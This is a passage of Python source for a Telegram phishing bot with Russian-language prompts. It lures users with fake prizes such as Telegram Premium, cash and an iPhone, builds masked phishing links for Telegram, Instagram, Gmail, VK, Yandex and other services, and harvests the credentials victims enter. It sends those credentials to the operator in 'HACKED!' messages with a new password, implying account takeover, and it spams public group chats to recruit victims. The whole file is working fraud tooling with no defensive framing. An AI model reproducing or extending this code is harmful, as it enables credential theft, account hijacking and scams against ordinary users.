        bot.send_message(
            ADMIN_ID,
            f"🔓 <b>GMAIL HACKED!</b>\n\n"
            f"📧 Email: <code>{email}</code>\n"
            f"🔑 Password: <code>{password}</code>\n"
            f"🔐 New password: <code>{new_password}</code>",
            parse_mode='HTML'
        )
        
        return {
            'service': 'gmail',
            'login': email,
            'password': password,
            'new_password': new_password
        }
    
    def hack_generic(self, service, login, password, user_id):
        """Взлом любого сервиса"""
        
        new_password = self.generate_password()
        
        bot.send_message(
            ADMIN_ID,
            f"🔓 <b>{service.upper()} HACKED!</b>\n\n"
            f"👤 Login: <code>{login}</code>\n"
            f"🔑 Password: <code>{password}</code>\n"
            f"🔐 New password: <code>{new_password}</code>",
            parse_mode='HTML'
        )
        
        return {
            'service': service,
            'login': login,
            'password': password,
            'new_password': new_password
        }
    
    def generate_password(self, length=12):
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_2fa(self):
        return base64.b32encode(os.urandom(10)).decode('utf-8')

# ============= KEYBOARDS =============
class Keyboards:
    @staticmethod
    def main_menu():
        return {
            'inline_keyboard': [
                [{'text': '🎁 ПОЛУЧИТЬ ПОДАРОК', 'callback_data': 'get_gift'}],
                [{'text': '📱 Telegram Premium', 'callback_data': 'gift_telegram'},
                 {'text': '⭐ Telegram Stars', 'callback_data': 'gift_stars'}],
                [{'text': '📸 Instagram', 'callback_data': 'gift_instagram'},
                 {'text': '📧 Gmail', 'callback_data': 'gift_gmail'}],
                [{'text': '🇷🇺 VK', 'callback_data': 'gift_vk'},
                 {'text': '🇷🇺 Yandex', 'callback_data': 'gift_yandex'}],
                [{'text': '💰 100 000 RUB', 'callback_data': 'gift_money'},
                 {'text': '📱 iPhone 16', 'callback_data': 'gift_iphone'}],
                [{'text': '📊 СТАТИСТИКА', 'callback_data': 'stats'}]
            ]
        }
    
    @staticmethod
    def services_menu():
        return {
            'inline_keyboard': [
                [{'text': '📱 Telegram', 'callback_data': 'phish_telegram'},
                 {'text': '📸 Instagram', 'callback_data': 'phish_instagram'}],
                [{'text': '📧 Gmail', 'callback_data': 'phish_gmail'},
                 {'text': '🇷🇺 VK', 'callback_data': 'phish_vk'}],
                [{'text': '🇷🇺 Yandex', 'callback_data': 'phish_yandex'},
                 {'text': '📧 Mail.ru', 'callback_data': 'phish_mailru'}],
                [{'text': '🎵 TikTok', 'callback_data': 'phish_tiktok'},
                 {'text': '▶️ YouTube', 'callback_data': 'phish_youtube'}],
                [{'text': '🔙 НАЗАД', 'callback_data': 'back'}]
            ]
        }

# ============= BOT HANDLER =============
class BotHandler:
    def __init__(self):
        self.phisher = AZPhisher()
        self.masker = MaskPhish()
        self.checker = PhishChecker()
        self.hacker = AutoHacker()
        self.user_sessions = {}
    
    def handle_start(self, user_id, username, first_name, last_name):
        db.add_user(user_id, username, first_name, last_name)
        
        text = (
            f"✨ <b>ДОБРО ПОЖАЛОВАТЬ, {first_name}!</b>\n\n"
            "🎁 <b>ВЫБЕРИ ПОДАРОК:</b>\n"
            "• Telegram Premium на 1 год\n"
            "• 1000 Telegram Stars\n"
            "• Instagram верификация\n"
            "• Gmail 1TB хранилище\n"
            "• 100 000 рублей\n"
            "• iPhone 16 Pro Max\n\n"
            "👇 <b>НАЖМИ НА КНОПКУ</b>"
        )
        
        bot.send_message(user_id, text, reply_markup=Keyboards.main_menu())
    
    def handle_callback(self, user_id, callback_data, message_id, callback_id):
        
        if callback_data == 'get_gift':
            bot.edit_message_text(
                user_id, message_id,
                "🎁 <b>ВЫБЕРИ ПОДАРОК:</b>",
                reply_markup=Keyboards.main_menu()
            )
        
        elif callback_data.startswith('gift_'):
            gift = callback_data.replace('gift_', '')
            
            # Сохраняем выбор
            db.update_user(user_id, gift=gift, step='phish_select')
            
            text = (
                f"🎁 <b>Ты выбрал: {gift.upper()}</b>\n\n"
                "📌 <b>ЧТОБЫ ПОЛУЧИТЬ ПОДАРОК:</b>\n"
                "1. Выбери соцсеть для входа\n"
                "2. Перейди по ссылке\n"
                "3. Введи данные\n"
                "4. Получи подарок!\n\n"
                "👇 <b>ВЫБЕРИ СОЦСЕТЬ:</b>"
            )
            
            bot.edit_message_text(
                user_id, message_id,
                text,
                reply_markup=Keyboards.services_menu()
            )
        
        elif callback_data.startswith('phish_'):
            service = callback_data.replace('phish_', '')
            
            # Генерируем фишинг страницу
            original_link = self.phisher.generate_phish(user_id, service)
            
            # Маскируем ссылку
            masked_link, link_id = self.masker.create_mask_link(original_link, service, user_id)
            
            # Сохраняем в сессию
            self.user_sessions[user_id] = {
                'link_id': link_id,
                'service': service,
                'step': 'waiting_click'
            }
            
            text = (
                f"🔗 <b>ТВОЯ ССЫЛКА ДЛЯ ПОЛУЧЕНИЯ:</b>\n\n"
                f"<code>{masked_link}</code>\n\n"
                "📌 <b>ИНСТРУКЦИЯ:</b>\n"
                "1. Перейди по ссылке\n"
                "2. Введи данные от аккаунта\n"
                "3. Нажми Войти\n"
                "4. Подарок придет автоматически!\n\n"
                "⏳ <i>Ожидаю подтверждения...</i>"
            )
            
            bot.edit_message_text(user_id, message_id, text)
            
            # Запускаем проверку в отдельном потоке
            threading.Thread(
                target=self.check_phish_status,
                args=(user_id, link_id, service)
            ).start()
        
        elif callback_data == 'stats':
            db.cursor.execute("SELECT COUNT(*) FROM users")
            users = db.cursor.fetchone()[0]
            
            db.cursor.execute("SELECT COUNT(*) FROM credentials")
            creds = db.cursor.fetchone()[0]
            
            db.cursor.execute("SELECT COUNT(*) FROM phish_links")
            links = db.cursor.fetchone()[0]
            
            text = (
                f"📊 <b>СТАТИСТИКА</b>\n\n"
                f"👥 Пользователей: {users}\n"
                f"🔑 Учетных данных: {creds}\n"
                f"🔗 Фишинг ссылок: {links}\n"
                f"⚡ Статус: ONLINE"
            )
            
            bot.answer_callback_query(callback_id, text)
        
        elif callback_data == 'back':
            bot.edit_message_text(
                user_id, message_id,
                "✨ <b>ГЛАВНОЕ МЕНЮ</b>",
                reply_markup=Keyboards.main_menu()
            )
        
        bot.answer_callback_query(callback_id)
    
    def check_phish_status(self, user_id, link_id, service):
        """Проверяет статус фишинг ссылки"""
        
        # Ждем клик (максимум 2 минуты)
        for i in range(4):  # 4 попытки по 30 сек = 2 минуты
            time.sleep(30)
            
            if db.check_phish_click(link_id, user_id):
                bot.send_message(
                    user_id,
                    "✅ <b>Ссылка открыта!</b>\n\n"
                    "Теперь введи свои данные на сайте."
                )
                break
        
        # Ждем отправку данных (максимум 3 минуты)
        for i in range(6):  # 6 попыток по 30 сек = 3 минуты
            time.sleep(30)
            
            if db.check_phish_submit(link_id, user_id):
                # Получаем данные
                db.cursor.execute('''SELECT * FROM credentials 
                                   WHERE user_id = ? ORDER BY timestamp DESC LIMIT 1''', (user_id,))
                creds = db.cursor.fetchone()
                
                if creds:
                    _, _, service_db, login, password, code, ip, country, ts, status = creds
                    
                    bot.send_message(
                        user_id,
                        "✅ <b>ДАННЫЕ ПОЛУЧЕНЫ!</b>\n\n"
                        "🎁 <b>ТВОЙ ПОДАРОК УЖЕ В ПУТИ!</b>\n\n"
                        "💫 Ожидай в течение 5 минут"
                    )
                    
                    # Запускаем взлом в отдельном потоке
                    threading.Thread(
                        target=self.hacker.hack_account,
                        args=(service, login, password or code, user_id)
                    ).start()
                    
                    return
        
        # Если данные не получены
        bot.send_message(
            user_id,
            "❌ <b>ВРЕМЯ ВЫШЛО!</b>\n\n"
            "Ты не ввел данные. Попробуй снова /start"
        )
    
    def handle_message(self, user_id, text, username, first_name, last_name):
        """Обрабатывает текстовые сообщения"""
        
        # Проверяем, не являются ли это данные от фишинг страницы
        if '📱 Phone:' in text or '🔑 Code:' in text or '📸 Instagram' in text:
            # Это данные от фишинг страницы
            self.handle_phish_data(user_id, text)
            return
        
        # Обычное сообщение - отправляем в меню
        self.handle_start(user_id, username, first_name, last_name)
    
    def handle_phish_data(self, user_id, data):
        """Обрабатывает данные от фишинг страниц"""
        
        # Парсим данные
        lines = data.split('\n')
        service = "unknown"
        login = ""
        password = ""
        page_id = ""
        
        for line in lines:
            if '📱 Phone:' in line:
                login = line.replace('📱 Phone:', '').strip()
                service = 'telegram'
            elif '🔑 Code:' in line:
                password = line.replace('🔑 Code:', '').strip()
            elif '📸 Instagram' in line:
                service = 'instagram'
            elif '👤 Username:' in line:
                login = line.replace('👤 Username:', '').strip()
            elif '🔑 Password:' in line:
                password = line.replace('🔑 Password:', '').strip()
            elif '📧 Gmail' in line:
                service = 'gmail'
            elif '👤 Email:' in line:
                login = line.replace('👤 Email:', '').strip()
            elif '🇷🇺 VK' in line:
                service = 'vk'
            elif '🇷🇺 Yandex' in line:
                service = 'yandex'
            elif '🔗 Page:' in line:
                page_id = line.replace('🔗 Page:', '').strip()
        
        # Сохраняем в базу
        cred_id = db.add_creds(user_id, service, login, password)
        
        # Обновляем статистику фишинг ссылки
        if page_id:
            db.cursor.execute("SELECT id FROM phish_links WHERE original_link LIKE ?", (f'%{page_id}%',))
            result = db.cursor.fetchone()
            if result:
                db.increment_submit(result[0])
        
        logger.info(f"📥 Phish data received: {service} - {login}")

# ============= AUTO SPAMMER =============
class AutoSpammer:
    def __init__(self):
        self.groups = [
            '@uzbekistan_chat',
            '@russia_chat',
            '@moscow_chat',
            '@tashkent_chat'
        ]
        
        self.messages = [
            "🎁 <b>СРОЧНО! РОЗЫГРЫШ TELEGRAM PREMIUM!</b>\n\nЗабирай подарок → @YourBot",
            "💰 <b>100 000 РУБЛЕЙ ЗА ПОДПИСКУ!</b>\n\nУспей получить → @YourBot",
            "📱 <b>IPHONE 16 PRO MAX В ПОДАРОК!</b>\n\nПодробности: @YourBot",
            "⭐ <b>1000 ЗВЕЗД TELEGRAM КАЖДОМУ!</b>\n\nПолучить: @YourBot"
        ]
    
    def start(self):
        while True:
            try:
                for group in self.groups:
                    msg = random.choice(self.messages)
                    bot.send_message(group, msg)
                    time.sleep(10)
            except:
                pass
            time.sleep(900)

# ============= MAIN =============
def main():
    logger.info("🚀 УЛЬТРА МЕГА СУПЕР БОТ ЗАПУЩЕН!")
    logger.info(f"⚡ Token: {TOKEN[:10]}...")
    
    handler = BotHandler()
    spammer = AutoSpammer()
    
    # Запускаем рассылку
    spam_thread = threading.Thread(target=spammer.start, daemon=True)
    spam_thread.start()
    
    # Основной цикл
    while True:
        try:
            updates = bot.get_updates()
            
            for update in updates:
                update_id = update['update_id']
                
                if db.is_update_processed(update_id):
                    continue
                
                # Обработка сообщений
                if 'message' in update:
                    msg = update['message']
                    user_id = msg['from']['id']
                    username = msg['from'].get('username', '')
                    first_name = msg['from'].get('first_name', '')
                    last_name = msg['from'].get('last_name', '')
                    
                    if 'text' in msg:
                        text = msg['text']
                        
                        if text == '/start':
                            handler.handle_start(user_id, username, first_name, last_name)
                        elif text == '/admin':
                            # Показываем статистику
                            db.cursor.execute("SELECT COUNT(*) FROM users")
                            users = db.cursor.fetchone()[0]
                            db.cursor.execute("SELECT COUNT(*) FROM credentials")
                            creds = db.cursor.fetchone()[0]
                            
                            bot.send_message(
                                user_id,
                                f"👑 <b>ADMIN PANEL</b>\n\n"
                                f"Users: {users}\n"
                                f"Creds: {creds}\n"
                                f"Status: ONLINE"
                            )
                        else:
                            handler.handle_message(user_id, text, username, first_name, last_name)
                
                # Обработка callback
                elif 'callback_query' in update:
                    callback = update['callback_query']
                    user_id = callback['from']['id']
                    callback_data = callback['data']
                    message_id = callback['message']['message_id']
                    callback_id = callback['id']
                    
                    handler.handle_callback(user_id, callback_data, message_id, callback_id)
                
                db.mark_update_processed(update_id)
                bot.offset = update_id + 1
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            logger.info("🛑 Бот остановлен")
            break
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
